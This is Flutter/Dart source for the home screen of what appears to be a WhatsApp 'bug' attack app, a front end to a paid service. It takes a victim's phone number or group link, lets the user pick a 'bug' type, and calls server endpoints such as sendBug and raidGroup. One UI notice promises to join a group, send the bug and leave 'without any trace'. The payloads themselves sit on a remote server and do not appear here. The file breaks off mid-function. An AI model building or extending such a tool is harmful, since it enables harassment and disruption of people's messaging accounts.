import 'dart:async';
import 'dart:convert';
import 'dart:ui' as ui;
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'dart:core';
import 'dart:math' as math;

class HomePage extends StatefulWidget {
final String username;
final String password;
final String sessionKey;
final List<Map<String, dynamic>> listBug;
final String role;
final String expiredDate;

const HomePage({
super.key,
required this.username,
required this.password,
required this.sessionKey,
required this.listBug,
required this.role,
required this.expiredDate,
});

@override
State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
final targetController = TextEditingController();
final groupLinkController = TextEditingController();
String selectedBugId = "";
bool _isSending = false;
String? _responseMessage;
int _selectedPrivateBugIndex = 0;
int _selectedGlobalBugIndex = 0;
int _selectedGroupBugIndex = 0;
bool _isRefreshing = false;
late VideoPlayerController _videoController;
bool _isVideoInitialized = false;
bool _isGroupMode = false;

// Cyberpunk Palette
final Color primaryDark = const Color(0xFF050505);
final Color cardDark = const Color(0xFF0A0A0F);
final Color cardDarker = const Color(0xFF020203);
final Color neonCyan = const Color(0xFF00F0FF);
final Color neonPink = const Color(0xFFFF0055);
final Color neonPurple = const Color(0xFFBD00FF);
final Color glassWhite = const Color(0xFFFFFFFF).withOpacity(0.03);
final Color glassBorder = const Color(0xFFFFFFFF).withOpacity(0.08);

late AnimationController _controller;
late AnimationController _fadeController;
late Animation<double> _animation;
late Animation<double> _fadeAnimation;
late AnimationController _bgMeshController;

// Variabel untuk sender status
String _selectedSenderMode = "private";
int _privateActive = 0;
int _globalActive = 0;
bool _isLoadingSenders = false;
Timer? _refreshTimer;

// Cooldown global sender
bool _isGlobalCooldown = false;
int _globalCooldownSeconds = 0;
Timer? _cooldownTimer;

String baseUrl = "";
List<Map<String, dynamic>> groupBugs = [];
List<Map<String, dynamic>> globalBugs = [];

@override
void initState() {
super.initState();

if (widget.listBug.isNotEmpty) {    
  selectedBugId = widget.listBug[0]['bug_id'];    
  _selectedPrivateBugIndex = 0;    
}    
  
if (groupBugs.isNotEmpty) {    
  _selectedGroupBugIndex = 0;    
}    

_controller = AnimationController(duration: const Duration(milliseconds: 800), vsync: this);    
_fadeController = AnimationController(duration: const Duration(milliseconds: 1200), vsync: this);    
_bgMeshController = AnimationController(vsync: this, duration: const Duration(seconds: 20))..repeat();  

_animation = CurvedAnimation(parent: _controller, curve: Curves.easeInOut);    
_fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(CurvedAnimation(parent: _fadeController, curve: Curves.easeInOut));    

_controller.forward();    
_fadeController.forward();    

_initializeVideoPlayer();    
_loadConfigAndFetch();    
  
_refreshTimer = Timer.periodic(const Duration(seconds: 30), (timer) {    
  if (mounted) fetchActiveSenders();    
});

}

Future<void> _loadConfig() async {
try {
final response = await http.get(Uri.parse("https://raw.githubusercontent.com/seishiro9/server1/refs/heads/main/srv1.json"));
final data = jsonDecode(response.body);
baseUrl = data['base_url'];
} catch (e) {}
}

Future<void> _loadGlobalBugs() async {
try {
final response = await http.get(Uri.parse("$baseUrl/getGlobalBugs")).timeout(const Duration(seconds: 10));
if (response.statusCode == 200) {
final data = jsonDecode(response.body);
if (data['status'] == true && data['bugs'] != null) {
setState(() {
globalBugs = List<Map<String, dynamic>>.from(data['bugs']);
if (globalBugs.isNotEmpty && _selectedGlobalBugIndex == 0) _selectedGlobalBugIndex = 0;
});
}
}
} catch (e) {
print("Error load global bugs: $e");
setState(() { globalBugs = []; });
}
}

Future<void> _loadConfigAndFetch() async {
await _loadConfig();
await _loadGlobalBugs();
await _loadGroupBugs();
await fetchActiveSenders();
}

Future<void> _initializeVideoPlayer() async {
    try {
      _videoController = VideoPlayerController.asset("assets/videos/banner.mp4");
      await _videoController.initialize();
      if (!mounted) return;
      setState(() {
        _videoController.setVolume(0.5);
        _videoController.setLooping(true);
        _videoController.play();
        _isVideoInitialized = true;
      });
    } catch (error) {
      print("Video initialization error: $error");
      if (!mounted) return;
      setState(() {
        _isVideoInitialized = false;
      });
    }
  }

  static const String cyberFont = "Orbitron";

@override
void dispose() {
targetController.dispose();
groupLinkController.dispose();
_videoController.dispose();
_controller.dispose();
_fadeController.dispose();
_bgMeshController.dispose();
_refreshTimer?.cancel();
_cooldownTimer?.cancel();
super.dispose();
}

String? formatPhoneNumber(String input) {
final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
return cleaned;
}

Future<void> fetchActiveSenders() async {
setState(() { _isLoadingSenders = true; });
try {
final response = await http.get(Uri.parse("$baseUrl/getAllActiveSenders?privateUsername=${widget.username}")).timeout(const Duration(seconds: 10));
if (response.statusCode == 200) {
final data = jsonDecode(response.body);
if (data['status'] == true) {
setState(() {
_privateActive = data['private_active'] ?? 0;
_globalActive = data['global_active'] ?? 0;
_isLoadingSenders = false;
});
} else { setState(() { _isLoadingSenders = false; }); }
} else { setState(() { _isLoadingSenders = false; }); }
} catch (e) {
print("Error fetch active senders: $e");
setState(() { _isLoadingSenders = false; });
}
}

Future<void> _loadGroupBugs() async {
try {
final response = await http.get(Uri.parse("$baseUrl/groupBugs")).timeout(const Duration(seconds: 10));
if (response.statusCode == 200) {
final data = jsonDecode(response.body);
if (data['status'] == true && data['bugs'] != null) {
setState(() {
groupBugs = List<Map<String, dynamic>>.from(data['bugs']);
if (groupBugs.isNotEmpty && _selectedGroupBugIndex == 0) {
_selectedGroupBugIndex = 0;
selectedBugId = groupBugs[0]['bug_id'];
}
});
}
}
} catch (e) {
print("Error load group bugs: $e");
setState(() { groupBugs = []; });
}
}

Future<void> checkGlobalCooldown() async {
if (_selectedSenderMode != "global") return;
try {
final response = await http.get(Uri.parse("$baseUrl/checkGlobalCooldown?key=${widget.sessionKey}"));
if (response.statusCode == 200) {
final data = jsonDecode(response.body);
if (data['onCooldown'] == true) {
setState(() { _isGlobalCooldown = true; _globalCooldownSeconds = data['remainingSeconds'] ?? 0; });
startCooldownTimer();
} else {
setState(() { _isGlobalCooldown = false; _globalCooldownSeconds = 0; });
_cooldownTimer?.cancel();
}
}
} catch (e) { print("Error check cooldown: $e"); }
}

void startCooldownTimer() {
_cooldownTimer?.cancel();
_cooldownTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
if (_globalCooldownSeconds <= 1) {
setState(() { _isGlobalCooldown = false; _globalCooldownSeconds = 0; });
timer.cancel();
} else {
setState(() { _globalCooldownSeconds--; });
}
});
}

Future<void> _sendBug() async {
if (_isGroupMode) await _attackGroup();
else await _sendContactBug();
}

Future<void> _sendContactBug() async {
final rawInput = targetController.text.trim();
final target = formatPhoneNumber(rawInput);
final key = widget.sessionKey;
final senderMode = _selectedSenderMode;

if (senderMode == "global") {  
  await checkGlobalCooldown();  
  if (_isGlobalCooldown) {  
    _showAlert("Cooldown", "Global sender sedang cooldown!\nTunggu ${_globalCooldownSeconds} detik lagi.");  
    return;  
  }  
}  

String bugToSend = "";  
if (senderMode == "global") {  
  if (globalBugs.isNotEmpty && _selectedGlobalBugIndex < globalBugs.length) {  
    bugToSend = globalBugs[_selectedGlobalBugIndex]['bug_id'];  
  } else { bugToSend = "delay"; }  
} else { bugToSend = selectedBugId; }  

if (target == null || key.isEmpty) {  
  _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, +1, +44), bukan 08xxx.");  
  return;  
}  

setState(() { _isSending = true; _responseMessage = null; });  

try {  
  final res = await http.get(Uri.parse("$baseUrl/sendBug?key=$key&target=$target&bug=$bugToSend&senderMode=$senderMode"));  
  final data = jsonDecode(res.body);  

  if (data["cooldown"] == true) {    
    _showAlert("Cooldown", data["message"] ?? "Tunggu beberapa saat.");    
    await checkGlobalCooldown();    
  } else if (data["valid"] == false) {    
    setState(() => _responseMessage = "Key Invalid: Silakan login ulang.");    
  } else if (senderMode != "global" && data['sender'] == false) {    
    _showAlert("Failed", "kamu tidak memiliki sender pribadi!\nsilahkan add sender terlebih dahulu");    
  } else if (data["sended"] == false) {    
    setState(() => _responseMessage = "Gagal: Server sedang maintenance.");    
  } else {    
    final modeText = senderMode == "global" ? "GLOBAL" : "PRIVATE";    
    String bugName = "";    
    if (senderMode == "global") {    
      if (globalBugs.isNotEmpty && _selectedGlobalBugIndex < globalBugs.length) {    
        bugName = globalBugs[_selectedGlobalBugIndex]['bug_name'];    
      } else { bugName = "Global Bug"; }    
    } else { bugName = widget.listBug[_selectedPrivateBugIndex]['bug_name']; }    
      
    _showAlert("Success", "Berhasil mengirim bug ke $target!\nMode: $modeText\nBug: $bugName");    
    targetController.clear();    
    fetchActiveSenders();    
    if (senderMode == "global") await checkGlobalCooldown();    
  }  
} catch (_) {  
  setState(() => _responseMessage = "Error: Terjadi kesalahan. Coba lagi.");  
} finally {  
  setState(() { _isSending = false; });  
}

}

Future<void> _attackGroup() async {
final groupLink = groupLinkController.text.trim();
final key = widget.sessionKey;
final senderMode = "private";

if (groupLink.isEmpty || !groupLink.contains('chat.whatsapp.com')) {    
  _showAlert("Invalid Link", "Please enter a valid WhatsApp group link.");    
  return;    
}    

setState(() { _isSending = true; });    

try {    
  final response = await http.get(Uri.parse("$baseUrl/raidGroup?key=$key&link=$groupLink&bug=$selectedBugId&senderMode=$senderMode")).timeout(const Duration(seconds: 30), onTimeout: () { throw Exception('Request timeout'); });    

  if (response.statusCode == 200) {    
    final data = jsonDecode(response.body);    
    if (data['valid'] == false) { _showAlert("Failed", "Invalid session key. Please login again."); return; }    
    if (data["cooldown"] == true) { _showAlert("Cooldown", "Tunggu beberapa saat."); return; }    
    if (data['sender'] == false) { _showAlert("Failed", "kamu tidak memiliki sender pribadi!\nsilahkan add sender terlebih dahulu"); return; }    
    if (data['sended'] == true) {    
      _showAlert("Success", "Successfully sent bug to group!\nUsing PRIVATE sender");    
      groupLinkController.clear();    
      fetchActiveSenders();    
    } else { _showAlert("Failed", "Failed to send bug to group. Please try again."); }    
  } else { _showAlert("Server Error", "Failed to connect to server. Please try again."); }    
} catch (e) {    
  print('Group bug error: $e');    
  _showAlert("Error", "An error occurred. Please check your connection and try again.");    
} finally {    
  setState(() { _isSending = false; });    
}

}

void _showAlert(String title, String msg) {
showDialog(context: context, builder: (ctx) => BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 20, sigmaY: 20), child: Dialog(backgroundColor: Colors.transparent, insetPadding: const EdgeInsets.all(24), child: ClipRRect(borderRadius: BorderRadius.circular(28), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 15, sigmaY: 15), child: Container(padding: const EdgeInsets.all(32), decoration: BoxDecoration(gradient: LinearGradient(begin: Alignment.topCenter, end: Alignment.bottomCenter, colors: [cardDark.withOpacity(0.98), cardDarker]), borderRadius: BorderRadius.circular(28), border: Border.all(color: neonCyan.withOpacity(0.3), width: 1.5), boxShadow: [BoxShadow(color: neonCyan.withOpacity(0.15), blurRadius: 30, spreadRadius: 2)]), child: Column(mainAxisSize: MainAxisSize.min, children: [
Container(padding: const EdgeInsets.all(20), decoration: BoxDecoration(shape: BoxShape.circle, gradient: LinearGradient(colors: title.contains('✅') ? [neonCyan.withOpacity(0.3), neonCyan.withOpacity(0.1)] : title.contains('❌') ? [neonPink.withOpacity(0.3), neonPink.withOpacity(0.1)] : [neonPurple.withOpacity(0.3), neonPurple.withOpacity(0.1)])), child: Icon(title.contains('✅') ? Icons.check_circle : title.contains('❌') ? Icons.error : Icons.info, color: title.contains('✅') ? neonCyan : title.contains('❌') ? neonPink : neonPurple, size: 40)),
const SizedBox(height: 24),
Text(title, style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold, letterSpacing: 0.5, fontFamily: cyberFont), textAlign: TextAlign.center),
const SizedBox(height: 16),
Padding(padding: const EdgeInsets.symmetric(horizontal: 8), child: Text(msg, style: TextStyle(color: Colors.white.withOpacity(0.7), fontSize: 15, height: 1.5), textAlign: TextAlign.center)),
const SizedBox(height: 32),
SizedBox(width: double.infinity, height: 56, child: ElevatedButton(onPressed: () => Navigator.pop(ctx), style: ElevatedButton.styleFrom(backgroundColor: title.contains('✅') ? neonCyan.withOpacity(0.15) : title.contains('❌') ? neonPink.withOpacity(0.15) : neonPurple.withOpacity(0.15), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: title.contains('✅') ? neonCyan.withOpacity(0.5) : title.contains('❌') ? neonPink.withOpacity(0.5) : neonPurple.withOpacity(0.5), width: 1.5)), elevation: 0), child: Text("ACKNOWLEDGE", style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 2, fontFamily: cyberFont))))
])))))));
}

Widget _buildCyberCard({required Widget child, Color? accentColor}) {
final color = accentColor ?? neonCyan;
return ClipRRect(borderRadius: BorderRadius.circular(24), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 15, sigmaY: 15), child: Container(margin: const EdgeInsets.symmetric(vertical: 10, horizontal: 16), padding: const EdgeInsets.all(24), decoration: BoxDecoration(color: glassWhite, borderRadius: BorderRadius.circular(24), border: Border.all(color: glassBorder, width: 1), boxShadow: [BoxShadow(color: color.withOpacity(0.05), blurRadius: 20, spreadRadius: -5)]), child: child)));
}

Widget _iconBox(IconData icon, {Color? color}) {
final c = color ?? neonCyan;
return Container(padding: const EdgeInsets.all(12), decoration: BoxDecoration(color: c.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: c.withOpacity(0.3), width: 1), boxShadow: [BoxShadow(color: c.withOpacity(0.2), blurRadius: 10, spreadRadius: -2)]), child: Icon(icon, color: c, size: 22));
}

Widget _buildProfileCard() {
return _buildCyberCard(accentColor: neonPurple, child: Row(children: [
Container(padding: const EdgeInsets.all(3), decoration: BoxDecoration(shape: BoxShape.circle, border: Border.all(color: neonPurple.withOpacity(0.5), width: 2), boxShadow: [BoxShadow(color: neonPurple.withOpacity(0.3), blurRadius: 15, spreadRadius: 2)]), child: Stack(children: [
const CircleAvatar(radius: 32, backgroundColor: Color(0xFF1A1A2E), child: Icon(Icons.person_outline, color: Colors.white60, size: 32)),
Positioned(bottom: 0, right: 0, child: Container(padding: const EdgeInsets.all(4), decoration: BoxDecoration(color: primaryDark, shape: BoxShape.circle, border: Border.all(color: neonPurple.withOpacity(0.5), width: 1.5)), child: const Icon(Icons.verified, color: Color(0xFFDC143C), size: 14))),
])),
const SizedBox(width: 16),
Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
Text(widget.username, style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 22, letterSpacing: 0.5, fontFamily: cyberFont)),
const SizedBox(height: 4),
Text(widget.role.toUpperCase(), style: TextStyle(color: neonPurple.withOpacity(0.8), fontSize: 13, letterSpacing: 2, fontWeight: FontWeight.w600, fontFamily: cyberFont)),
])),
Container(padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10), decoration: BoxDecoration(color: neonPurple.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: neonPurple.withOpacity(0.3), width: 1)), child: Text("EXP: ${widget.expiredDate}", style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.w600, letterSpacing: 0.5, fontFamily: cyberFont))),
]));
}

Widget _buildVideoBanner() {
return SlideTransition(position: Tween<Offset>(begin: const Offset(0, -0.5), end: Offset.zero).animate(CurvedAnimation(parent: _controller, curve: Curves.easeOut)), child: Container(margin: const EdgeInsets.symmetric(vertical: 8, horizontal: 16), width: double.infinity, height: 280, decoration: BoxDecoration(borderRadius: BorderRadius.circular(24), boxShadow: [BoxShadow(color: neonCyan.withOpacity(0.15), blurRadius: 30, spreadRadius: -5)]), child: ClipRRect(borderRadius: BorderRadius.circular(24), child: Stack(fit: StackFit.expand, children: [
if (_isVideoInitialized) SizedBox(width: double.infinity, height: 280, child: FittedBox(fit: BoxFit.cover, child: SizedBox(width: _videoController.value.size.width, height: _videoController.value.size.height, child: VideoPlayer(_videoController))))
else Container(decoration: BoxDecoration(gradient: LinearGradient(colors: [cardDarker.withOpacity(0.8), cardDark.withOpacity(0.8)], begin: Alignment.topLeft, end: Alignment.bottomRight)), child: Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: const [Icon(Icons.play_arrow, color: Colors.grey, size: 40), SizedBox(height: 8), Text("Loading Video...", style: TextStyle(color: Colors.grey))]))),
Container(decoration: BoxDecoration(gradient: LinearGradient(colors: [Colors.black.withOpacity(0.7), Colors.transparent, Colors.black.withOpacity(0.8)], begin: Alignment.topCenter, end: Alignment.bottomCenter, stops: const [0.0, 0.5, 1.0]))),
BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 5, sigmaY: 5), child: Container(padding: const EdgeInsets.all(20), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(24)), child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
FadeTransition(opacity: Tween(begin: 0.6, end: 1.0).animate(_fadeController), child: Container(padding: const EdgeInsets.all(4), decoration: BoxDecoration(shape: BoxShape.circle, gradient: LinearGradient(colors: [cardDark.withOpacity(0.4), Colors.grey.withOpacity(0.4)]), boxShadow: [BoxShadow(color: neonCyan.withOpacity(0.2), blurRadius: 20, spreadRadius: 3)]), child: const CircleAvatar(radius: 40, backgroundImage: AssetImage('assets/images/sasi.jpg')))),
const SizedBox(height: 16),
ShaderMask(shaderCallback: (bounds) => LinearGradient(colors: [Colors.grey.shade400, Colors.white]).createShader(bounds), child: Text(widget.username, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 22, letterSpacing: 1.2, fontFamily: cyberFont))),
const SizedBox(height: 8),
Row(mainAxisAlignment: MainAxisAlignment.center, children: [
Container(padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6), decoration: BoxDecoration(color: Colors.grey.withOpacity(0.25), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.grey.withOpacity(0.5))), child: Text(widget.role.toUpperCase(), style: const TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: cyberFont))),
const SizedBox(width: 8),
Container(padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6), decoration: BoxDecoration(color: Colors.white.withOpacity(0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.3))), child: Text("Exp: ${widget.expiredDate}", style: const TextStyle(color: Colors.white70, fontSize: 12, fontFamily: cyberFont))),
]),
])))]))));
}

Widget _buildStatusBoxes() {
final allowedRoles = ['ADMIN', 'OWNER', 'MODERATOR', 'STAFF', 'DEVELOPER'];
final isAllowed = allowedRoles.contains(widget.role.toUpperCase());
if (_isGroupMode || !isAllowed) return const SizedBox.shrink();

return Padding(padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8), child: Row(children: [  
  Expanded(child: _buildSenderButton(mode: "private", label: "PRIVATE", icon: Icons.person, activeCount: _privateActive, isSelected: _selectedSenderMode == "private", onTap: () {  
    setState(() { _selectedSenderMode = "private"; _selectedPrivateBugIndex = 0; selectedBugId = widget.listBug.isNotEmpty ? widget.listBug[0]['bug_id'] : ""; });  
    _cooldownTimer?.cancel();  
    setState(() { _isGlobalCooldown = false; _globalCooldownSeconds = 0; });  
  })),  
  const SizedBox(width: 12),  
  Expanded(child: _buildSenderButton(mode: "global", label: "GLOBAL", icon: Icons.language, activeCount: _globalActive, isSelected: _selectedSenderMode == "global", isOnCooldown: _isGlobalCooldown, cooldownSeconds: _globalCooldownSeconds, onTap: () {  
    setState(() { _selectedSenderMode = "global"; _selectedGlobalBugIndex = 0; });  
    checkGlobalCooldown();  
  })),  
]));

}

Widget _buildSenderButton({required String mode, required String label, required IconData icon, required int activeCount, required bool isSelected, required VoidCallback onTap, bool isOnCooldown = false, int cooldownSeconds = 0}) {
final accent = mode == "global" ? neonPink : neonCyan;
return GestureDetector(onTap: onTap, child: AnimatedContainer(duration: const Duration(milliseconds: 300), decoration: BoxDecoration(borderRadius: BorderRadius.circular(16), gradient: isSelected ? LinearGradient(colors: [accent.withOpacity(0.15), accent.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight) : null), child: ClipRRect(borderRadius: BorderRadius.circular(16), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 10, sigmaY: 10), child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(color: isSelected ? accent.withOpacity(0.1) : glassWhite, borderRadius: BorderRadius.circular(16), border: Border.all(color: isSelected ? accent.withOpacity(0.5) : glassBorder, width: isSelected ? 1.5 : 1), boxShadow: isSelected ? [BoxShadow(color: accent.withOpacity(0.2), blurRadius: 15, spreadRadius: -3)] : []), child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
Row(mainAxisAlignment: MainAxisAlignment.center, children: [
Icon(icon, color: isSelected ? accent : Colors.white.withOpacity(0.4), size: 18),
const SizedBox(width: 8),
Text(label, style: TextStyle(color: isSelected ? accent : Colors.white.withOpacity(0.5), fontSize: 13, fontWeight: isSelected ? FontWeight.bold : FontWeight.w600, letterSpacing: 1, fontFamily: cyberFont)),
]),
const SizedBox(height: 6),
Text(_isLoadingSenders ? "..." : "$activeCount Active", style: TextStyle(color: isSelected ? accent.withOpacity(0.7) : Colors.white.withOpacity(0.3), fontSize: 11, fontFamily: cyberFont)),
if (isOnCooldown && mode == "global") Padding(padding: const EdgeInsets.only(top: 4), child: Text("⏱️ ${cooldownSeconds}s", style: TextStyle(color: neonPink.withOpacity(0.9), fontSize: 10, fontWeight: FontWeight.bold, fontFamily: cyberFont))),
]))))));
}

Widget _buildModeSwitcher() {
return Container(margin: const EdgeInsets.symmetric(vertical: 10, horizontal: 16), child: Row(children: [
Expanded(child: _buildModeButton(icon: Icons.person, label: "Contact Bug", isSelected: !_isGroupMode, onTap: () {
setState(() { _isGroupMode = false; _selectedSenderMode = "private"; _selectedPrivateBugIndex = 0; selectedBugId = widget.listBug.isNotEmpty ? widget.listBug[0]['bug_id'] : ""; });
_cooldownTimer?.cancel();
setState(() { _isGlobalCooldown = false; _globalCooldownSeconds = 0; });
})),
const SizedBox(width: 12),
Expanded(child: _buildModeButton(icon: Icons.groups, label: "Group Bug", isSelected: _isGroupMode, onTap: () {
setState(() { _isGroupMode = true; _selectedGroupBugIndex = 0; selectedBugId = groupBugs.isNotEmpty ? groupBugs[0]['bug_id'] : ""; _selectedSenderMode = "private"; });
_cooldownTimer?.cancel();
setState(() { _isGlobalCooldown = false; _globalCooldownSeconds = 0; });
})),
]));
}

Widget _buildModeButton({required IconData icon, required String label, required bool isSelected, required VoidCallback onTap}) {
final accent = isSelected ? neonCyan : Colors.white.withOpacity(0.3);
return GestureDetector(onTap: onTap, child: AnimatedContainer(duration: const Duration(milliseconds: 300), clipBehavior: Clip.antiAlias, decoration: BoxDecoration(borderRadius: BorderRadius.circular(16), border: Border.all(color: isSelected ? neonCyan.withOpacity(0.4) : glassBorder, width: 1.5), boxShadow: isSelected ? [BoxShadow(color: neonCyan.withOpacity(0.15), blurRadius: 15, spreadRadius: -3)] : []), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 10, sigmaY: 10), child: Container(padding: const EdgeInsets.symmetric(vertical: 16), decoration: BoxDecoration(color: isSelected ? neonCyan.withOpacity(0.08) : glassWhite, borderRadius: BorderRadius.circular(16)), child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
Icon(icon, color: isSelected ? neonCyan : Colors.white.withOpacity(0.5), size: 20),
const SizedBox(width: 8),
Text(label, style: TextStyle(color: isSelected ? neonCyan : Colors.white.withOpacity(0.6), fontSize: 14, fontWeight: isSelected ? FontWeight.bold : FontWeight.w500, fontFamily: cyberFont, letterSpacing: 0.5)),
])))));
}

Widget _buildTargetNumberCard() {
if (_isGroupMode) {
return _buildCyberCard(accentColor: neonPink, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
Row(children: [_iconBox(Icons.link, color: neonPink), const SizedBox(width: 14), const Text("Group Link", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 18, letterSpacing: 0.5, fontFamily: cyberFont))]),
const SizedBox(height: 20),
ClipRRect(borderRadius: BorderRadius.circular(16), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 5, sigmaY: 5), child: Container(decoration: BoxDecoration(color: glassWhite, borderRadius: BorderRadius.circular(16), border: Border.all(color: glassBorder, width: 1)), child: TextField(controller: groupLinkController, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w500), cursorColor: neonPink, decoration: InputDecoration(hintText: "https://chat.whatsapp.com/...", hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 13), prefixIcon: Icon(Icons.link, color: neonPink.withOpacity(0.5), size: 20), filled: false, border: InputBorder.none, contentPadding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16)))))),
const SizedBox(height: 12),
  Container(padding: const EdgeInsets.all(14), decoration: BoxDecoration(color: neonPink.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: neonPink.withOpacity(0.3), width: 1)), child: Row(children: [Icon(Icons.info_outline, color: neonPink.withOpacity(0.8), size: 18), const SizedBox(width: 10), Expanded(child: Text("This tool will automatically join the group, send a bug, and leave without any trace.", style: TextStyle(color: Colors.white.withOpacity(0.6), fontSize: 11))) ])),
]));
} else {
return _buildCyberCard(accentColor: neonCyan, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
Row(children: [_iconBox(Icons.phone_android, color: neonCyan), const SizedBox(width: 14), const Text("Target Number", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 18, letterSpacing: 0.5, fontFamily: cyberFont))]),
const SizedBox(height: 20),
ClipRRect(borderRadius: BorderRadius.circular(16), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 5, sigmaY: 5), child: Container(decoration: BoxDecoration(color: glassWhite, borderRadius: BorderRadius.circular(16), border: Border.all(color: glassBorder, width: 1)), child: TextField(controller: targetController, style: const TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w500), cursorColor: neonCyan, decoration: InputDecoration(hintText: "e.g. +62xxxxxxxxxx", hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 14), prefixIcon: Icon(Icons.language, color: neonCyan.withOpacity(0.5), size: 22), filled: false, border: InputBorder.none, contentPadding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16)))))),
]));
}
}

Widget _buildBugTypeCard() {
if (_isGroupMode) return _buildBugCardList(groupBugs, _selectedGroupBugIndex, (index) { setState(() { _selectedGroupBugIndex = index; selectedBugId = groupBugs[index]['bug_id']; }); }, "Group Bug Type", neonPink);
if (!_isGroupMode && _selectedSenderMode == "global") {
if (globalBugs.isEmpty) return _buildBugCardList([], 0, (index) {}, "Global Bug Type", neonPurple);
return _buildBugCardList(globalBugs, _selectedGlobalBugIndex, (index) { setState(() { _selectedGlobalBugIndex = index; selectedBugId = globalBugs[index]['bug_id']; }); }, "Global Bug Type", neonPurple);
}
return _buildBugCardList(widget.listBug, _selectedPrivateBugIndex, (index) { setState(() { _selectedPrivateBugIndex = index; selectedBugId = widget.listBug[index]['bug_id']; }); }, "Bug Type", neonCyan);
}

Widget _buildBugCardList(List<Map<String, dynamic>> bugs, int selectedIndex, Function(int) onTap, String titleText, Color accent) {
return _buildCyberCard(accentColor: accent, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
Row(children: [_iconBox(Icons.bug_report, color: accent), const SizedBox(width: 12), Text(titleText, style: TextStyle(fontFamily: cyberFont, fontSize: 18, fontWeight: FontWeight.bold, color: accent, letterSpacing: 1))]),
const SizedBox(height: 20),
if (bugs.isEmpty) Container(height: 130, alignment: Alignment.center, child: Text("Scanning for bugs...", style: TextStyle(color: accent.withOpacity(0.5), fontFamily: cyberFont)))
else SizedBox(height: 130, child: ListView.builder(scrollDirection: Axis.horizontal, itemCount: bugs.length, itemBuilder: (context, index) {
final bug = bugs[index];
final bool isSelected = selectedIndex == index;
return GestureDetector(onTap: () => onTap(index), child: AnimatedContainer(duration: const Duration(milliseconds: 300), curve: Curves.easeOutBack, width: 200, margin: const EdgeInsets.only(right: 12), padding: const EdgeInsets.all(16), decoration: BoxDecoration(borderRadius: BorderRadius.circular(16), color: isSelected ? accent.withOpacity(0.15) : cardDarker, border: Border.all(color: isSelected ? accent.withOpacity(0.6) : glassBorder, width: 1.5), boxShadow: isSelected ? [BoxShadow(color: accent.withOpacity(0.3), blurRadius: 20, spreadRadius: -2)] : []), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
Row(children: [const Icon(FontAwesomeIcons.whatsapp, color: Colors.white, size: 18), const Spacer(), if (isSelected) Icon(Icons.check_circle, color: accent, size: 18)]),
const SizedBox(height: 12),
Text(bug['bug_name'].toString(), style: const TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.bold), maxLines: 2, overflow: TextOverflow.ellipsis),
])));
})),
const SizedBox(height: 16),
if (bugs.isNotEmpty) Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(bugs.length, (index) {
final isActive = selectedIndex == index;
return AnimatedContainer(duration: const Duration(milliseconds: 300), margin: const EdgeInsets.symmetric(horizontal: 4), width: isActive ? 20 : 8, height: 8, decoration: BoxDecoration(borderRadius: BorderRadius.circular(20), color: isActive ? accent : Colors.white24, boxShadow: isActive ? [BoxShadow(color: accent.withOpacity(0.4), blurRadius: 8)] : []));
})),
]));
}

Widget _buildSendButton() {
final accent = _isGroupMode ? neonPink : neonCyan;
